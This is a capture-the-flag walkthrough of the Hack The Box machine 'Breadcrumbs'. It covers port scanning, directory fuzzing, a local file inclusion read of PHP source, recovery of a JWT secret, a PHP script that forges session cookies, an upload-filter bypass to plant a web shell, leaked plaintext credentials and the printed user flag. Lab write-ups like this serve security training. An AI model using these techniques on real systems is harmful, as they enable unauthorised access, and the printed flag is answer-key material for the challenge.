# HACKTHE BOX  Breadcrumbs
![](https://i.imgur.com/Nu6Rfwe.png)

# Port
<style type="text/css">
.tg  {border-collapse:collapse;border-spacing:0;}
.tg td{border-color:black;border-style:solid;border-width:1px;font-family:Arial, sans-serif;font-size:14px;
  overflow:hidden;padding:10px 5px;word-break:normal;}
.tg th{border-color:black;border-style:solid;border-width:1px;font-family:Arial, sans-serif;font-size:14px;
  font-weight:normal;overflow:hidden;padding:10px 5px;word-break:normal;}
.tg .tg-0pky{border-color:inherit;text-align:left;vertical-align:top}
</style>
<table class="tg">
<thead>
  <tr>
    <th class="tg-0pky">Port</th>
    <th class="tg-0pky">Service</th>
    <th class="tg-0pky">Version</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td class="tg-0pky">22</td>
    <td class="tg-0pky">ssh</td>
    <td class="tg-0pky">OpenSSH for_Windows_7.7</td>
  </tr>
  <tr>
    <td class="tg-0pky">80</td>
    <td class="tg-0pky">http</td>
    <td class="tg-0pky">Apache httpd 2.4.46</td>
  </tr>
  <tr>
    <td class="tg-0pky">135</td>
    <td class="tg-0pky">msrpc</td>
    <td class="tg-0pky">Windows RPC</td>
  </tr>
  <tr>
    <td class="tg-0pky">445,139</td>
    <td class="tg-0pky">msrpc</td>
    <td class="tg-0pky">Microsoft Windows RPC</td>
  </tr>
  <tr>
    <td class="tg-0pky">443</td>
    <td class="tg-0pky">https</td>
    <td class="tg-0pky">Apache httpd 2.4.46</td>
  </tr>
  <tr>
    <td class="tg-0pky">3306</td>
    <td class="tg-0pky">mysql</td>
    <td class="tg-0pky"></td>
  </tr>
  <tr>
    <td class="tg-0pky">7680</td>
    <td class="tg-0pky">pando-pub</td>
    <td class="tg-0pky"></td>
  </tr>
  <tr>
    <td class="tg-0pky">5040</td>
    <td class="tg-0pky">unknown</td>
    <td class="tg-0pky"></td>
  </tr>
</tbody>
</table>

# Nmap
```sql
# Nmap 7.91 scan initiated Thu May 20 05:57:04 2021 as: nmap -T5 -p- -sCV --min-rate 25000 -oN nmap/allnmap.txt --vv 10.10.10.228
Warning: 10.10.10.228 giving up on port because retransmission cap hit (2).
Increasing send delay for 10.10.10.228 from 0 to 5 due to 4169 out of 10422 dropped probes since last increase.
Nmap scan report for 10.10.10.228
Host is up, received reset ttl 127 (0.29s latency).
Scanned at 2021-05-20 05:57:05 EDT for 225s
Not shown: 42167 filtered ports, 23354 closed ports
Reason: 42167 no-responses and 23354 resets
PORT      STATE SERVICE       REASON          VERSION
22/tcp    open  ssh           syn-ack ttl 127 OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 9d:d0:b8:81:55:54:ea:0f:89:b1:10:32:33:6a:a7:8f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD1/bmEHFv3nRSf2uH/akLLIfkmpxbSWiVReOdwmJrM2iD9g1gqVHIceIxat222PnYkLHYG23lUQMiTXcvuwBHeB+dMUNv09IHDKCCT9XOTWc+900zrFLRoyR6LQ2O3vQ+JgWpWlvtZAV6FvcSSK3ai767qIdBNG8SAxwwQZlSxX7D/n28VJlPcXXtzoiSt+lQ1T1sq7qIXPM2CyY7qoTLjcvDz/IYqbXbinsLLOCZ9MnRnDbE8E9tLeAJGcxhpNgk0LNN6xGbj49zVhy1TRrVNhh4RD+uczVqufMQIHdCnL61p9ZIepQxhJvwSf4IHH+oaM6wy3Yu0W6pg5wQWXIkj
|   256 1f:2e:67:37:1a:b8:91:1d:5c:31:59:c7:c6:df:14:1d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMPvEspRGrd2/vma82j25vli6C/Td5Gvl44e9IhXeZOlvojawx4tbo/OdBytc+X9b/OSP01kLK4Od62NrQmN39s=
|   256 30:9e:5d:12:e3:c6:b7:c6:3b:7e:1e:e7:89:7e:83:e4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII+TY3313X2GdjXH6r6IrDURWI4H4itbZG41GaktT00D
80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Library
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      syn-ack ttl 127 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET POST
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
|_http-title: Library
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
| SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds? syn-ack ttl 127
3306/tcp  open  mysql?        syn-ack ttl 127
| fingerprint-strings: 
|   NULL, RTSPRequest, SMBProgNeg: 
|_    Host '10.10.14.6' is not allowed to connect to this MariaDB server
| mysql-info: 
|_  MySQL Error: Host '10.10.14.6' is not allowed to connect to this MariaDB server
5040/tcp  open  unknown       syn-ack ttl 127
7680/tcp  open  pando-pub?    syn-ack ttl 127
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=7%D=5/20%Time=60A63292%P=x86_64-pc-linux-gnu%r(NU
SF:LL,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.6'\x20is\x20not\x20allowe
SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RTSPRequest,4
SF:9,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.6'\x20is\x20not\x20allowed\x2
SF:0to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SMBProgNeg,49,"E\
SF:0\0\x01\xffj\x04Host\x20'10\.10\.14\.6'\x20is\x20not\x20allowed\x20to\x
SF:20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -57m16s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 19737/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 9573/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 57631/udp): CLEAN (Failed to receive data)
|   Check 4 (port 51923/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-20T09:03:16
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 20 06:00:50 2021 -- 1 IP address (1 host up) scanned in 225.35 seconds
```

## Webpage 
![](https://i.imgur.com/oas4cdf.png)

## FUZZ
```bash
ffuf -w /opt/wordlists/medium.txt   -u http://10.10.10.228/portal/FUZZ -e .php,.html,.txt, | tee ffuf/ffuf.out                                                       
                                                                                                                                                                         
        /'___\  /'___\           /'___\                                                                                                                                  
       /\ \__/ /\ \__/  __  __  /\ \__/                                                                                                                                  
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                                                                                 
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/       
         \ \_\   \ \_\  \ \____/  \ \_\        
          \/_/    \/_/   \/___/    \/_/        

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.228/portal/FUZZ
 :: Wordlist         : FUZZ: /opt/wordlists/medium.txt
 :: Extensions       : .php .html .txt  
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

index.php               [Status: 302, Size: 0, Words: 1, Lines: 1]
login.php               [Status: 200, Size: 2507, Words: 652, Lines: 49]
uploads                 [Status: 301, Size: 345, Words: 22, Lines: 10]
uploads                 [Status: 301, Size: 345, Words: 22, Lines: 10]
signup.php              [Status: 200, Size: 2734, Words: 727, Lines: 53]
assets                  [Status: 301, Size: 344, Words: 22, Lines: 10]
assets                  [Status: 301, Size: 344, Words: 22, Lines: 10]
php                     [Status: 301, Size: 341, Words: 22, Lines: 10]
php                     [Status: 301, Size: 341, Words: 22, Lines: 10]
includes                [Status: 301, Size: 346, Words: 22, Lines: 10]
includes                [Status: 301, Size: 346, Words: 22, Lines: 10]
Index.php               [Status: 302, Size: 0, Words: 1, Lines: 1]
Login.php               [Status: 200, Size: 2507, Words: 652, Lines: 49]
db                      [Status: 301, Size: 340, Words: 22, Lines: 10]
logout.php              [Status: 302, Size: 12, Words: 13, Lines: 1]
vendor                  [Status: 301, Size: 344, Words: 22, Lines: 10]
vendor                  [Status: 301, Size: 344, Words: 22, Lines: 10]
cookie.php              [Status: 200, Size: 0, Words: 1, Lines: 1]
PHP                     [Status: 301, Size: 341, Words: 22, Lines: 10]
PHP                     [Status: 301, Size: 341, Words: 22, Lines: 10]
%20                     [Status: 403, Size: 301, Words: 22, Lines: 10]
%20                     [Status: 403, Size: 301, Words: 22, Lines: 10]
Assets                  [Status: 301, Size: 344, Words: 22, Lines: 10]
Assets                  [Status: 301, Size: 344, Words: 22, Lines: 10]
```

if  we check http://10.10.10.228/js/books.js file its showing lfi so we can try lfi on books

![](https://i.imgur.com/zoKuE15.png)

### Checking books  

```bash
http://10.10.10.228/php/books.php
```
![](https://i.imgur.com/2vl1xUE.png)

### So it is tackig a html file. so we can check for LFI

![](https://i.imgur.com/96MbSpT.png)

![](https://i.imgur.com/KCgVrJz.png)

we  can read `../includes/bookController.php` file 


# windows LFI 
-  local file inclusion detected in brute force 

![](https://i.imgur.com/8GqPLTI.png)

![](https://i.imgur.com/TvktpRz.png)

### copied to a file and remove `\r\n` 
```bash
cat login.php | sed 's/\\r\\n//g'
```

 ```bash
 ╭─root@kali ~/Desktop/htb/Breadcrumbs/www ‹master*› 
╰─# cat login.php | sed 's/\\r\\n//g'        
<?phprequire_once 'authController.php'; ?><html lang=\"en\">    <head>        <title>Binary<\/title>        <meta charset=\"utf-8\">        <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">        <link rel=\"stylesheet\" href=\"https:\/\/maxcdn.bootstrapcdn.com\/bootstrap\/4.0.0\/css\/bootstrap.min.css\" integrity=\"sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW\/dAiS6JXm\" crossorigin=\"anonymous\">        <script src=\"https:\/\/ajax.googleapis.com\/ajax\/libs\/jquery\/3.2.1\/jquery.min.js\"><\/script>        <link rel=\"stylesheet\" type=\"text\/css\" href=\"assets\/css\/main.css\">        <link rel=\"stylesheet\" type=\"text\/css\" href=\"assets\/css\/all.css\">    <\/head><body class=\"bg-dark text-white\">    <div class=\"container-fluid mt-5\">        <div class=\"row justify-content-center\">            <div class=\"col-md-4 form-div\">                <div class=\"alert alert-danger\">                    <p class=\"text-dark\">Restricted domain for: <span class='text-danger'><?=$IP?><\/span><br> Please return <a href=\"..\/\">home<\/a> or contact <a href=\"php\/admins.php\">helper<\/a> if you think there is a mistake.<\/p>                <\/div>                <h3 class=\"text-center\">Login <i class=\"fas fa-lock\"><\/i><\/h3>                <form action=\"login.php\" method=\"post\">                    <?php if(count($errors)>0):?>                    <div class=\"alert alert-danger\">                        <?php foreach($errors as $error): ?>                        <li><?php echo $error; ?><\/li>                        <?php endforeach?>                    <\/div>                    <?php endif?>                    <div class=\"form-group\">                        <label for=\"username\">Username<\/label>                        <input type=\"text\" name=\"username\" class=\"form-control form-control-lg\">                    <\/div>\t\t\t\t\t                    <div class=\"form-group\">                        <label for=\"password\">Password<\/label>                        <input type=\"password\" name=\"password\" class=\"form-control form-control-lg\">                    <\/div>                                        <input value=\"0\" name=\"method\" style=\"display:none;\">                    <div class=\"form-group\">                         <button type=\"submit\" class=\"btn btn-primary btn-block btn-lg\">Login<\/button>                    <\/div>                    <p class=\"text-center\">Dont have an account? <a href=\"signup.php\">Sign up<\/a><\/p>                <\/form>            <\/div>        <\/div>    <\/div>    <?php include 'includes\/footer.php' ?><\/body><\/html>"
````

<!--⚠️Imgur upload failed, check dev console-->

- authController.php

![](https://i.imgur.com/4Fsi7DY.png)

-  Found secret key create jwt 

```bash
secret key : 6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e
```

![](https://i.imgur.com/LWBMofk.png)

- cookie.php

![](https://i.imgur.com/F5urvLZ.png)


```php
╭─root@kali ~/Desktop/htb/Breadcrumbs/www ‹master*› 
╰─# cat cookie.php                                 
<?php
 **
 * @param string $username  Username requesting session cookie
 * 
 * @return string $session_cookie Returns the generated cookie
 * 
 * @devteam
 * Please DO NOT use default PHPSESSID; our security team says they are predictable.
 * CHANGE SECOND PART OF MD5 KEY EVERY WEEK
 * *
function makesession($username){
    $max = strlen($username) - 1;
    $seed = rand(0, $max);
    $key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";
    $session_cookie = $username.md5($key);

    return $session_cookie;
}
```


## making cookie --> [online compiler](https://onecompiler.com/php/3x3f2dcmr)

```php
<?php
/**
 * @param string $username  Username requesting session cookie
 * 
 * @return string $session_cookie Returns the generated cookie
 * 
 * @devteam
 * Please DO NOT use default PHPSESSID; our security team says they are predictable.
 * CHANGE SECOND PART OF MD5 KEY EVERY WEEK
 * */

$arrusernames = ["alex","paul","jack","olivia","john","william","emma","lucas","sirine","juliette","support"];
$arrlen = count($arrusernames);


function makesession($username){
    $max = strlen($username) - 1;
    $seed = rand(0, $max);
    $key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";
    $session_cookie = $username.md5($key);

    echo $session_cookie;
}

/**while ($i < $arrlen)
        {
            echo makesession($arrusernames[$i]) ."<br />";
            $i++;
        }
**/
makesession('paul');
?>
```

![](https://i.imgur.com/sf1E7rV.png)


## Now we have the session PHPSSID = paul61ff9d4aaefe6bdf45681678ba89ff9d

## now we need jWT token so lets create it from https://jwt.io
```bash
secret key : 6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e
```
![](https://i.imgur.com/q823Ev2.png)

## Now We can login as  paul  
![](https://i.imgur.com/VzweGRN.png)

```bash
http://10.10.10.228/portal/php/files.php
```
![](https://i.imgur.com/Wj7KpjX.png)

![](https://i.imgur.com/MN0UJoj.png)

```bash
/portal/includes/fileController.php
```

![](https://i.imgur.com/xb1Ywgw.png)

```bash
$secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e'
```

now we can create a new cookie with this secret key

![](https://i.imgur.com/IMTYtpF.png)

now the error is gone ....! 

-  it is only adding zip file to i have created a text file add give extention to .zip and tried to bypass this 


![](https://i.imgur.com/7pZV3Jm.png)

## if we check the uploads folder is there with php extension

![](https://i.imgur.com/YBQvci4.png)

## I have uploaded [p0wny-shell]( https://github.com/flozz/p0wny-shell)

# i have got www-data 

![](https://i.imgur.com/PSLLogT.png)

![](https://i.imgur.com/CSn6e5n.png)

![](https://i.imgur.com/FvonwOW.png)
```json
juliette.json
{
	"pizza" : "margherita",
	"size" : "large",
	"drink" : "water",
	"card" : "VISA",
	"PIN" : "9890",
	"alternate" : {
		"username" : "juliette",
		"password" : "jUli901./())!",
	}
}
```

```bash
user : juliette
pass : jUli901./())!
```

# User 
## SSH on SERVER
```bash
juliette@BREADCRUMBS C:\Users\juliette\Desktop>whoami
breadcrumbs\juliette

juliette@BREADCRUMBS C:\Users\juliette\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 7C07-CD3A

 Directory of C:\Users\juliette\Desktop

01/15/2021  05:04 PM    <DIR>          .
01/15/2021  05:04 PM    <DIR>          ..
12/09/2020  07:27 AM               753 todo.html
06/22/2021  08:14 PM                34 user.txt
               2 File(s)            787 bytes
               2 Dir(s)   6,239,354,880 bytes free

juliette@BREADCRUMBS C:\Users\juliette\Desktop>more user.txt
66844a57485ba0925b7d297afbe167be

juliette@BREADCRUMBS C:\Users\juliette\Desktop>
```